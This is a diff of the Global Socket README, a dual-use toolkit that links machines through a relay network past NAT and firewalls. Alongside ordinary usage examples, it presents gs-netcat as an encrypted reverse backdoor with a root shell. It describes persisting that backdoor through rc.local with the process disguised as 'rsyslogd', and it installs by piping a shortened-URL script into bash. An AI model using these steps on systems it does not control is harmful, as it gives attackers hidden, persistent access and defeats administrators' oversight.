@@ -1,9 +1,33 @@
 # Global Socket
-**Moving data from here to there. Securely, Fast and trough NAT/Firewalls.**
+<!---
+See https://shields.io/category/license
+[![License: MIT](https://img.shields.io/github/license/hackerschoice/gsocket)](https://opensource.org/licenses/MIT)
+[![Github file count](https://img.shields.io/github/directory-file-count/hackerschoice/gsocket\?style\=plastic)](https://GitHub.com/hackerschoice/gsocket/)
+--->
+[![GitHub release](https://img.shields.io/github/release/hackerschoice/gsocket\?style\=plastic)](https://github.com/hackerschoice/gsocket/releases/)
+[![License](https://img.shields.io/badge/License-BSD%202--Clause-orange.svg?style=plastic)](https://opensource.org/licenses/BSD-2-Clause)
+[![GitHub Build](https://img.shields.io/badge/build-passing-green.svg\?style\=plastic\&logo\=appveyor)](https://www.gsocket.io/)
+[![GitHub Quality](https://img.shields.io/badge/quality-A-green.svg\?style\=plastic)](https://www.gsocket.io/)
+[![GitHub Platform](https://img.shields.io/badge/platform-linux\|osx\|cygwin\|FreeBSD-green.svg\?style\=plastic)](https://www.gsocket.io/)
+[![GitHub coverage](https://img.shields.io/badge/coverage-100%25-green.svg\?style\=plastic)](https://www.gsocket.io/)
+[![Maintenance](https://img.shields.io/badge/Maintained-yes-green.svg\?style\=plastic)](https://github.com/hackerschoice/gsocket/graphs/commit-activity)
+[![Website shields.io](https://img.shields.io/website-up-down-green-red/http/www.gsocket.io.svg\?style\=plastic)](https://www.gsocket.io/)
+[![Github all downloads](https://img.shields.io/github/downloads/hackerschoice/gsocket/total\?style\=plastic)](https://GitHub.com/hackerschoice/gsocket/)
+[![GitHub telegram](https://img.shields.io/badge/chat-telegram-blue.svg\?style\=plastic\&logo\=telegram)](https://t.me/thcorg/)
+[![GitHub twitter](https://img.shields.io/twitter/follow/hackerschoice?label=Follow)](https://twitter.com/hackerschoice)
+[![GitHub stars](https://img.shields.io/github/stars/hackerschoice/gsocket\?style\=social)](https://GitHub.com/hackerschoice/gsocket/stargazers/)
 
-![Anim](https://hackerschoice.github.io/gsocket-anim2.gif)
+**Connect like there is no firewall. Securely.**
 
-Global Socket allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.
+The Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.  
+More on [https://www.gsocket.io](https://www.gsocket.io).
+
+[![Watch the video](https://www.gsocket.io/assets/images/eeelite-console-640x378.png)](https://www.youtube.com/watch?v=tmf9VGDPILE)
+
+Video 1: [gs-netcat reverse login shell and EEElite-console](https://www.youtube.com/watch?v=tmf9VGDPILE)  
+Video 2: [Using gsocket to hijack OpenSSH](https://www.youtube.com/watch?v=Nn6BAeeVJIc)  
+Video 3: [Blitz files through firewalls](https://www.thc.org/gsocket-anim2.gif)  
+
 
 **Features:**
 - Uses the Global Socket Relay Network to connect TCP pipes
@@ -13,62 +37,64 @@ Global Socket allows two users behind NAT/Firewall to establish a TCP connection
 - Perfect Forward Secrecy
 - TOR support (optional)
 
-Abandon the thinking that an IP Address is needed to communicate with somebody. Instead start thinking that two users should be able to communicate with each other as long as they know the same secret (key/password). The Global Socket library handles the rest: It locally derives temporary session keys and IDs and connects with the other user trough the Global Socket Relay Network (GSRN). Once found the library then negotiates a secure TLS connection between both users (End-2-End). The password/secret never leaves your workstation. **The GSRN sees only the encrypted traffic**.
+Abandon the thought of IP Addresses and Port Numbers. Instead start thinking that two programs should be able to communicate with each other as long as they know the same secret (rather than each other\'s IP Address and Port Number). The Global Socket library facilitates this: It locally derives temporary session keys and IDs and connects two programs through the Global Socket Relay Network (GSRN) regardless and independent of the local IP Address or geographical location. Once connected the library then negotiates a secure TLS connection(End-2-End). The secret never leaves your workstation. **The GSRN sees only the encrypted traffic**.
 
-The GSRN is a free cloud service and is free to use by anyone.
+The [GSRN](https://www.gsocket.io/gsrn) is a free cloud service and is free to use by anyone.
 
-Includes:
-* **gs-netcat** - Netcat on steroids. Turn gs-netcat into an AES-256 encrypted reverse backdoor via TOR (optional) with a true PTY/interactive command shell (```gs-netcat -s MySecret -i```), spawn a Socks4/4a/5 proxy or forward TCP connections or give somebody temporary shell access.
+The Global Socket Toolkit comes with a set of tools:
+* **gsocket** - Makes an existing program (behind firewall or NAT) accessible from anywhere in the world. It does so by analyzing the program and replacing the IP-Layer with its own Gsocket-Layer. A client connection to a hostname ending in *'\*.gsocket'* then gets automatically redirected (via the GSRN) to this program.
+* **gs-netcat** - Netcat on steroids. Turn gs-netcat into an AES-256 encrypted reverse backdoor via TOR (optional) with a true PTY/interactive command shell (```gs-netcat -s MySecret -i```), integrated file-transfer, spawn a Socks4/4a/5 proxy or forward TCP connections or give somebody temporary shell access.
 * **gs-sftp** - sftp server & client between two firewalled workstations (```gs-sftp -s MySecret```)
 * **gs-mount** - Access and mount a remote file system (```gs-mount -s MySecret ~/mnt/warez```)
-* **blitz** - Copy data (single or recursivley) (```blitz -s MySecret /usr/share/*```)
+* **blitz** - Copy data from workstation to workstation (```blitz -s MySecret /usr/share/*```)
 * ...many more examples and tools.
 
 <A></A>|<A></A>
 ----------|-------------
-Download|[gsocket-1.4.22.tar.gz](https://github.com/hackerschoice/gsocket/releases/download/v1.4.22/gsocket-1.4.22.tar.gz) (Linux, MacOS, FreeBSD, Solaris)
-Debian/Ubuntu| [gsocket_1.4.22_all.deb](https://github.com/hackerschoice/binary/raw/main/gsocket/latest/gsocket_1.4.22_all.deb)
-Windows| use docker (see below)
-Man Page| [gs-netcat(1)](https://hackerschoice.github.io/gs-netcat.1.html), [gs-mount(1)](https://hackerschoice.github.io/gs-mount.1.html), [gs-sftp(1)](https://hackerschoice.github.io/gs-sftp.1.html), [blitz(1)](https://hackerschoice.github.io/blitz.1.html)
+Download|[gsocket-1.4.30.tar.gz](https://github.com/hackerschoice/gsocket/releases/download/v1.4.30/gsocket-1.4.30.tar.gz) (Linux, MacOS, FreeBSD, Solaris)
+Debian/Ubuntu| [gsocket_1.4.30_all.deb](https://github.com/hackerschoice/binary/raw/main/gsocket/latest/gsocket_1.4.30_all.deb)
+Windows| use docker or cygwin
+Man Page| [gsocket(1)](https://hackerschoice.github.io/gsocket.1.html), [gs-netcat(1)](https://hackerschoice.github.io/gs-netcat.1.html), [gs-mount(1)](https://hackerschoice.github.io/gs-mount.1.html), [gs-sftp(1)](https://hackerschoice.github.io/gs-sftp.1.html), [blitz(1)](https://hackerschoice.github.io/blitz.1.html)
 Docker|  docker run --rm -it hackerschoice/gsocket
 Docker| docker run --rm -it hackerschoice/gsocket-tor # gs via TOR
 
-**BETA BETA BETA. PRIVATE RELEASE ONLY.**
 ---
-**TEST SERVER FOR TESTING = TRY ANY OF THESE COMMANDS**
-
-The Test-Server is running behind NAT/FIREWALL. The commands below will use the GSRN to connect to the Test-Server.
-```
-### Access the test-server
-$ gs-sftp -s thctestserver
-
-### Mount a directory from the test-server to your local workstation
-$ mkdir ~/mnt
-$ gs-mount -s thctestserver ~/mnt   
-
-### Transfer 'directory-with-stuff' to the test-server
-$ blitz -s blitztestserver directory-with-stuff
-
-### Transfer all your mp3 to the test-server
-$ find . -name '*.mp3' | blitz -s blitztestserver -f -
-
-### Get a root-shell on the test-server
-$ gs-netcat -s AskUsForThePassword -i
-```
-Run your own server by using option *-l* and pick your own password (option *-s \<secret\>*). The server does not need to be reachable from the Internet.
+**Examples**
+<A></A>|<A></A>
+----------|-------------
+All| [examples](examples)
+OpenSSH via GSRN| [examples/sshd](examples/sshd)  
+WireGuard via GSRN| [examples/wireguard](examples/wireguard)  
+Root-Shell via GSRN| [examples/systemd-root-shell](examples/systemd-root-shell)  
+IRCD via GSRN| [examples/port-forward](examples/port-forward)  
 
 ---
+<a id="installation-anchor"></a>
 **Installation:**
 ```
-$ /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/hackerschoice/gsocket/master/install.sh)"
+$ /bin/bash -c "$(curl -fsSL https://tiny.cc/gsinst)"
 ```
 ---
 **Usage:**
 
-1. Log in to *Workstation A* from *Workstation B* through any firewall/NAT
+1. SSH from *Workstation B* to *Workstation A* through any firewall/NAT
 ```
-$ ./gs-netcat -l -i   # Workstation A
-$ ./gs-netcat -i      # Workstation B
+$ gsocket /usr/sbin/sshd     # Workstation A
+$ gsocket ssh root@gsocket   # Workstation B
+```
+See also: [gsocket(1)](https://hackerschoice.github.io/gsocket.1.html)
+
+2. OpenVPN between two firewalled workstations:
+```
+$ gsocket openvpn --dev tun1 --proto tcp-server --ifconfig 10.9.8.1 10.9.8.2                   # Workstation A
+$ gsocket openvpn --dev tun1 --proto tcp-client --ifconfig 10.9.8.2 10.9.8.1 --remote gsocket  # Workstation B
+```
+See also: [gsocket(1)](https://hackerschoice.github.io/gsocket.1.html)
+
+3. Log in to Workstation A from Workstation B through any firewall/NAT
+```
+$ gs-netcat -l -i   # Workstation A
+$ gs-netcat -i      # Workstation B
 ```
 See also: [gs-netcat(1)](https://hackerschoice.github.io/gs-netcat.1.html)
 
@@ -202,7 +228,9 @@ GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash
 
 exit 0
 ```
-During bootup the environment variables are not all set. Thus we set some values to make the backdoor more enjoyable (optionally): *TERM=xterm-256color* and *SHELL=/binb/bash* and *HOME=/root*. Next the startup script (*/etc/rc.local*) uses */bin/sh* which does not support our *exec -a* trick. Thus we use */bin/sh* to start */bin/bash* which in turn does the *exec -a* trick and starts *gs-netcat*. Puh. The gs-netcat process is hidden (as *rsyslogd*) from the process list.Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.
+Not all environment variables are set during system bootup. Set some variables to make the backdoor more enjoyable: *TERM=xterm-256color* and *SHELL=/bin/bash* and *HOME=/root*. The startup script (*/etc/rc.local*) uses */bin/sh* which does not support our *exec -a* trick. Thus we use */bin/sh* to start */bin/bash* which in turn does the *exec -a* trick and starts *gs-netcat*. Puh. The gs-netcat process is hidden (as *rsyslogd*) from the process list. Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.  
+
+Alternatively install gs-netcat as a [systemd service](examples/systemd-root-shell).
 
 Starting when the user logs in (and only once) can be done by adding this line to the user's *~/.profile* file:
 ```
